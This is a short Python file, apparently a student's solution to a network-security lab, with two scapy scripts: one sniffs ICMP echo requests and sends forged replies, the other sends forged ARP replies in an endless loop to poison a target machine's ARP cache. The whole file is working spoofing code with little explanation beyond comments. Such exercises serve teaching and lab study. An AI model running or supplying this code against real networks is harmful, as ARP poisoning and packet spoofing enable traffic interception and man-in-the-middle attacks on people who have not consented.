#NOTE:- Code runned in two different files
#ICMP SPOOFING CODE STARTS HERE 

from scapy.all import *

def sniff_and_spoof(packet):
    if ICMP in packet and packet[ICMP].type == 8:  # ICMP echo request
        # Swap source and destination IP
        ip = IP(src=packet[IP].dst, dst=packet[IP].src)
        # Create ICMP echo reply
        icmp = ICMP(type=0, id=packet[ICMP].id, seq=packet[ICMP].seq)
        # Copy the raw data
        raw_data = packet[Raw].load
        # Construct the new packet
        newpacket = ip / icmp / raw_data
        # Send the spoofed packet
        send(newpacket,iface="br-278e1964d941",  verbose=0)
        print(f"Spoofed ICMP reply sent to {packet[IP].src}")

# Sniff ICMP packets
sniff(filter="icmp and host 10.9.0.99",iface="br-278e1964d941",  prn=sniff_and_spoof)

#ICMP SPOOFING CODE ENDS HERE 

#ARP SPOOFING CODE  STARTS HERE
from scapy.all import *

# Target IP and MAC address
target_ip = "10.9.0.5"  # Replace with the IP of the machine you're attacking
target_mac = "02:42:0a:09:00:05"  # Replace with the MAC address of the target machine

# Fake IP (10.9.0.99) and your MAC address
fake_ip = "10.9.0.99"
your_mac = "02:42:bc:8d:21:74" # Mac of br-

# Continuously send ARP spoofing packets
print(f"Starting ARP spoofing: Associating {fake_ip} with {your_mac}")
while True:
    arp_spoof = ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=fake_ip, hwsrc=your_mac)
    send(arp_spoof, iface="br-278e1964d941", verbose=0)
    print(f"Sent ARP reply to {target_ip}: {fake_ip} is at {your_mac}")
#ARP SPOOFING CODE ENDS HERE
